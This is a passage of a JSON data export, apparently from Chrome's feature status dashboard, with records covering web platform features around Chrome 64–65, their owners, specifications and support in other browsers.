      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1310516",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "davidben@chromium.org",
          "svaldez@chromium.org",
          "agl@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Network>SSL"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/630147",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2016/06/15/building-a-faster-and-more-secure-web-with-tcp-fast-open-tls-false-start-and-tls-1-3/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://www.ietf.org/mail-archive/web/tls/current/msg23599.html",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The latest version of the Transport Layer Security (TLS) protocol. For M65, draft-23 of the protocol will be rolled out to Chrome users via a field trial.",
    "id": 5712755738804224,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-18 16:35:22.918420",
      "by": "sahel@chromium.org"
    },
    "name": "Wheel scroll latching and async wheel events",
    "tags": [
      "Scroll latching"
    ],
    "comments": "https://crbug.com/526463 is the tracking bug for wheel scroll latching and https://crbug.com/706175 is the bug for async wheel events.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "sahel@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/526463",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Latch to a single element for the duration of a wheel scroll. Only the first wheel event in a scrolling sequence is cancel-able.",
    "id": 5728708706959360,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1BizkQyW_FDU98sGxbHOZsAQWGYIA3xxXoFQZ3_XNo1o/edit"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-03-03 17:23:34.862300",
      "by": "ericbidelman@google.com"
    },
    "name": "Worklets",
    "tags": [
      "CSS",
      "Houdini"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://drafts.css-houdini.org/worklets/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "ikilpatrick@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>Workers"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=567358",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Worklets define a new javascript execution context which is designed to allow developers to write code which is intended to be run synchronously within the rendering engine, however independent of the main user javascript.\r\n\r\nThis feature was released in two stages. Worklets for paint were released in Chrome 65/Opera 52. Worklets for audio were released for Chrome 66/Opera 53.",
    "id": 5275637463908352,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-09 03:11:51.751270",
      "by": "rakina@google.com"
    },
    "name": "assignedElements on <slot>",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/#dom-slot-assignedelements",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1425685",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "rakina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "ios": 65,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=795544",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/15125746/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=174313",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add assignedElements on <slot>, similar to assignedNodes(), but returning Element nodes only. The method returns elements that are assigned to a given slot.\r\n",
    "id": 4555001598836736,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-12 20:15:24.018480",
      "by": "ericbidelman@google.com"
    },
    "name": "display: contents",
    "tags": [
      "display",
      "contents"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-display/#box-generation",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/37",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "ecobos@igalia.com",
          "futhark@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=657748",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/10938981-implement-the-box-generation-keywords-from-css-dis",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=157477",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "\"display: contents\" allows you to control the box generation of an element.\r\nThe element with \"display: contents\" won't generate any box, but its children and pseudo-elements will still do it as normal.\r\nIt's like the element has been replaced by its children and pseudo-elements.",
    "id": 5663606012116992,
    "resources": {
      "samples": [
        "https://rachelandrew.co.uk/archives/2016/01/29/vanishing-boxes-with-display-contents/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-20 10:01:35.102470",
      "by": "raphael.kubo.da.costa@intel.com"
    },
    "name": "document.all is no longer [Replaceable].",
    "tags": [
      "interoperability"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/obsolete.html#other-elements,-attributes-and-apis",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "yukishiino@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>Bindings"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=794433",
        "intervention": false
      },
      "opera": {
        "android": 65,
        "desktop": 65
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=173444",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "It has been possible for web developers to overwrite document.all for a long time, but according to the web standard, document.all will be no longer overwritable, i.e. it will be readonly.\r\n\r\n[before the change]\r\n    document.all = 42;\r\n    console.log(document.all);\r\n    // prints 42\r\n\r\n[after the change]\r\n    document.all = 42;\r\n    console.log(document.all);\r\n    // prints a HTMLAllCollection\r\n",
    "id": 5072231356956672,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-01-04 18:11:12.513330",
      "by": "jmedley@google.com"
    },
    "name": "toJSON for Performance and PerformanceEntry",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/performance-timeline/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceEntry",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "npm@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=740094",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/13522717/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Ever since WebIDL was deprecated in favor of toJSON [1], the Performance and PerformanceEntry specs added a mandatory toJSON method. This method should just call the default toJSON operation [2].\r\n\r\n[1] https://github.com/w3c/resource-timing/issues/112\r\n[2] https://heycam.github.io/webidl/#default-tojson-operation\r\n\r\nThe following interfaces will have toJSON added:\r\nPerformanceResourceTiming\r\nPerformanceLongTaskTiming\r\nTaskAttributionTiming",
    "id": 6730557958389760,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-11-27 03:11:24.157120",
      "by": "ericwilligers@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Animation for offset-path CSS property",
    "tags": [
      "offset-path",
      "motion path"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.fxtf.org/motion-1/#offset-path-property",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "ericwilligers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Animation"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=696412",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Authors using CSS Motion Path can now animate the path that an element moves along by animating the offset-path property ",
    "id": 5198375053950976,
    "resources": {
      "samples": [
        "http://codepen.io/ericwilligers/pen/PpqMqM"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-11-09 21:13:17.062470",
      "by": "fs@opera.com"
    },
    "name": "CSS transform-box",
    "tags": [
      "SVG",
      "Transform"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-transforms/#transform-box",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/55",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>SVG"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=595829",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/supportcsstransformsonsvg/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7622/release-notes-for-safari-technology-preview-31/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The transform-box property allows defining which reference box to use when computing 'transform' and 'transform-origin'. It currently only has an effect on SVG elements.",
    "id": 6643927633362944,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/transform-box"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-07 18:23:32.341040",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS4 text-decoration-skip-ink",
    "tags": [
      "decoration",
      "underline",
      "skipping",
      "descender",
      "gaps",
      "gap"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-text-decor-4/#text-decoration-skip-ink-property",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "drott@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=777428",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS Text Decoration 4: property controls how overlines and underlines are drawn when they cross over a glyph.\r\n\r\nWith the initial, default value \"auto\" decoration lines skip over where glyphs are drawn: interrupt the decoration line to let the shape of the text show through where the text decoration would otherwise cross over a glyph. The UA must also skip a small distance to either side of the glyph outline.\r\n\r\nTo disable this behavior, use `text-decoration-skip-ink: none`",
    "id": 5631679087509504,
    "resources": {
      "samples": [
        "https://codepen.io/anon/pen/GOadjL"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-09 01:21:25.338240",
      "by": "rakina@google.com"
    },
    "name": "Constructible & Subclassable EventTarget",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dom.spec.whatwg.org/#dom-eventtarget-eventtarget",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1379688",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "rakina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "ios": 64,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=740576",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/20015521-eventtarget-constructor",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=174313",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Make EventTarget constructor callable, allowing them to be constructed on their own or be subclassed.",
    "id": 5721972856061952,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-10-23 15:49:14.916230",
      "by": "panicker@chromium.org"
    },
    "name": "Deprecate and remove chrome.loadTimes",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "panicker@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=621512",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "chrome.loadTimes() is a non-standardized API that enables collecting loading related metrics to understand performance in the real world. However the metrics there are now available as standardized APIs, so this API will be deprecated and removed.\r\n",
    "id": 5637885046816768,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-11-14 03:28:03.004580",
      "by": "yhirano@chromium.org"
    },
    "name": "Fetch API: Request.cache",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#dom-request-cache",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1120715",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "yhirano@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://crbug.com/453190",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=162281",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A property which represents the cache mode of a Request. This feature includes RequestInit.cache which sets the property.",
    "id": 5166560033374208,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-11-09 01:41:33.241180",
      "by": "eirage@chromium.org"
    },
    "name": "Fractional coordinates in PointerEvents of type mouse",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/cssom-view/#extensions-to-the-mouseevent-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/pointerevents/issues/107#issuecomment-232939986",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "eirage@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://crbug.com/773813",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Make the coordinates in PointerEvents of pointerType=mouse fractional, in order to include the full precision provided by the underlying platform.",
    "id": 5117956774166528,
    "resources": {
      "samples": [
        "https://output.jsbin.com/quqoqe/4/quiet"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-03-09 02:06:40.757890",
      "by": "mattreynolds@chromium.org"
    },
    "name": "GamePad API vibration extension",
    "tags": [
      "gamepad",
      "rumble",
      "vibration",
      "vibrate",
      "haptics",
      "haptic"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/49",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 64
        },
        "owners": [
          "mattreynolds@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GamepadAPI"
        ],
        "desktop": 64,
        "flag": true,
        "bug": "http://crbug.com/749295",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://www.w3.org/2017/11/09-webplat-minutes.html",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Update the Standard Gamepad spec to include a rumble-style haptic feedback device and extend the Gamepad API to support vibration effects.",
    "id": 5705158763741184,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1jPKzVRNzzU4dUsvLpSXm1VXPQZ8FP-0lKMT-R_p-s6g"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-11-21 10:45:42.887240",
      "by": "mathias@chromium.org"
    },
    "name": "Intl.NumberFormat.prototype.formatToParts()",
    "tags": [
      "javascript",
      "ecmascript",
      "intl",
      "string",
      "i18n",
      "internationalization",
      "format",
      "js",
      "es6",
      "es7",
      "esnext"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/tc39/ecma402/pull/79",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1289882",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "jwolfe@igalia.com",
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>JavaScript>Internationalization"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5244",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3669",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Intl.NumberFormat.prototype.formatToParts() is scheduled to be added to the ECMAScript Internationalization API specification (Ecma 402). It adds a method to format a number to a list of tokens and their types (e.g. minusSign, integer, decimal, fraction, currency, percentSign, etc). It is implemented and disabled by default by Firefox.\r\n\r\nSee also, the corresponding DateTimeFormat feature here: https://www.chromestatus.com/feature/6319456309477376",
    "id": 5686840812109824,
    "resources": {
      "docs": [
        "https://github.com/tc39/ecma402/files/41759/formatToParts.pdf",
        "https://github.com/zbraniecki/proposal-intl-formatToParts",
        "https://github.com/tc39/ecma402/issues/30"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-10-30 16:42:26.402220",
      "by": "apacible@chromium.org"
    },
    "name": "Media preload defaults to metadata",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/#attr-media-preload",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 64
        },
        "owners": [
          "apacible@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 64,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://crbug.com/310450",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Set the default preload value for video and audio elements to “metadata”.\r\n\r\nNote that the preload attribute's hint is still ignored when a MediaSource is attached to the media element.",
    "id": 5682169347309568,
    "resources": {
      "samples": [
        "https://googlechrome.github.io/samples/media/preload-metadata"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2017-12-11 17:57:39.188480",
      "by": "jmedley@google.com"
    },
    "name": "Multiple Shadow Roots",
    "tags": [
      "Shadow DOM"
    ],
    "comments": "Multiple shadow roots is being deprecated.\r\nDropping this feature from the spec is the resolution at Web Components f2f meeting [1].\r\n\r\nOriginally released in Chrome 35.\r\n\r\n[1] https://www.w3.org/wiki/Webapps/WebComponentsApril2015Meeting",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webcomponents/spec/shadow/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 64
        },
        "owners": [
          "hayato@chromium.org",
          "kochi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 64,
        "flag": false,
        "android": 64,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=489947",
        "intervention": false
      },
      "opera": {
        "android": 51,
        "desktop": 51
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Enable elements to host more than one Shadow Roots. \r\n\r\nDropping this feature from the spec is the resolution at Web Components f2f meeting (https://www.w3.org/wiki/Webapps/WebComponentsApril2015Meeting) This was deprecated in Chrome 45. Removal is anticipated in Chrome 64.\r\n\r\nThis was deprecated in Chrome 45. \r\n",
    "id": 4668884095336448,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-12-14 18:02:06.782210",
      "by": "tbansal@google.com"
    },
    "name": "Network Information: saveData ",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://wicg.github.io/netinfo/#-dfn-savedata-dfn-attribute",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
